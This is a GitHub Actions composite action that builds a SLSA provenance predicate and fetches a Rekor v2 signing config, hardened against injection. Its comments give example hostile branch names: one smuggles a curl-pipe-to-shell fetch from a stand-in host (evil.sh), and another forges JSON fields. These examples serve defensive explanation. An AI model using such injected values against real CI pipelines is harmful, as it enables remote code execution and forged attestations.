name: 'Generate SLSA Predicate'
description: 'Generate a SLSA Build Provenance v1 predicate JSON for cosign attest-blob'

inputs:
  workflow_file:
    description: 'Workflow filename for builder ID (e.g., on-tag.yaml)'
    required: true

runs:
  using: 'composite'
  steps:
    - name: Generate SLSA predicate
      shell: bash
      env:
        # Every value reaches the script through env, never as an inline ${{ }}
        # inside the run block. Actions substitutes an expression into the script
        # TEXT before bash parses it, so a shell-active branch name is executed
        # rather than recorded: `git check-ref-format --branch 'feat/a$(id)b'`
        # exits 0, and ${IFS} sidesteps the no-space rule, which makes
        # `feat/x$(curl${IFS}evil.sh|sh)y` a valid branch name. A value read back
        # as $VAR is expanded but not re-scanned, so its content cannot execute.
        GH_REPOSITORY: ${{ github.repository }}
        GH_REF: ${{ github.ref }}
        GH_SHA: ${{ github.sha }}
        GH_RUN_ID: ${{ github.run_id }}
        WORKFLOW_FILE: ${{ inputs.workflow_file }}
      run: |
        set -euo pipefail
        PREDICATE="${RUNNER_TEMP}/slsa-predicate.json"

        # Env indirection stops execution but not JSON forgery: a double quote is
        # a legal ref character (`git check-ref-format --branch 'feat/a"b'` exits
        # 0), so a branch named `a", "malicious": "x` would close the string early
        # and graft an attacker-chosen field onto this attestation. jq --arg
        # renders a value as a complete, escaped JSON string literal, quotes
        # included, so the template below interpolates the literals bare. For a
        # value with nothing to escape the result is byte-identical to the old
        # inline form, which keeps the emitted predicate unchanged in practice.
        json_string() {
          jq -n --arg value "$1" '$value'
        }
        J_REPOSITORY="$(json_string "${GH_REPOSITORY}")"
        J_REF="$(json_string "${GH_REF}")"
        J_SHA="$(json_string "${GH_SHA}")"
        J_URI="$(json_string "git+https://github.com/${GH_REPOSITORY}@${GH_REF}")"
        J_BUILDER_ID="$(json_string "https://github.com/${GH_REPOSITORY}/.github/workflows/${WORKFLOW_FILE}")"
        J_INVOCATION_ID="$(json_string "https://github.com/${GH_REPOSITORY}/actions/runs/${GH_RUN_ID}")"

        cat > "$PREDICATE" <<-EOF
        {
          "buildDefinition": {
            "buildType": "https://aicr.run/binary/v1",
            "externalParameters": {
              "repository": ${J_REPOSITORY},
              "ref": ${J_REF}
            },
            "resolvedDependencies": [{
              "uri": ${J_URI},
              "digest": { "gitCommit": ${J_SHA} }
            }]
          },
          "runDetails": {
            "builder": {
              "id": ${J_BUILDER_ID}
            },
            "metadata": {
              "invocationId": ${J_INVOCATION_ID}
            }
          }
        }
        EOF
        echo "SLSA_PREDICATE=${PREDICATE}" >> "$GITHUB_ENV"

        # AICR signs release attestations to Rekor v2 (NVIDIA/aicr#1650). Fetch
        # the TUF-distributed v2 SigningConfig (Rekor v2 endpoint + timestamp
        # authority) so the goreleaser cosign + sign-catalog hooks can point
        # --signing-config at it. Co-located with SLSA_PREDICATE so the invariant
        # "signing enabled (SLSA_PREDICATE set) => signing config present" holds
        # for every signing workflow, not just the release. go run compiles aicr
        # from source (the built binaries do not exist yet). Requires Go, which
        # every caller sets up before this action.
        SC="${RUNNER_TEMP}/aicr-signing-config.json"
        # Retry the TUF fetch (3 attempts, 5s/10s backoff) to absorb transient
        # Sigstore TUF CDN blips, mirroring the goreleaser cosign hook — this is a
        # hard prerequisite for the whole signing flow, which fails closed if the
        # config is missing. The `-s` check treats an exit-0-but-empty-file result
        # as a failure so a truncated write is retried, not silently exported.
        for n in 1 2 3; do
          go run ./cmd/aicr trust update --emit-signing-config "${SC}" && [ -s "${SC}" ] && break
          if [ "$n" -lt 3 ]; then
            echo "trust update attempt $n failed; retrying" >&2
            sleep $((n * 5))
          else
            echo "trust update failed after 3 attempts" >&2
            exit 1
          fi
        done
        echo "AICR_SIGNING_CONFIG=${SC}" >> "$GITHUB_ENV"
        echo "Rekor v2 signing config written to ${SC}"
